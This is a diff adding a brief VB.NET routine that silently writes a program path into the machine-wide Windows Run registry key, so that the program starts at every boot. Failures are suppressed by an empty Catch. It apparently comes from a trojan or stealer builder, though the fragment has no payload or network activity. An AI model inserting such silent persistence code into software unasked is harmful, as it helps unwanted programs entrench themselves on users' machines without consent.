@@ -1,0 +1,10 @@
+﻿Sub InstallHKLM()
+        Try
+            Dim i As Integer = 0
+            For i = 0 To 100
+                If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).GetValue(startnameLM) Is Nothing Then
+                    Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(startnameLM, installpath & "\" & sname)
+                End If
+            Next
+        Catch : End Try
+End Sub
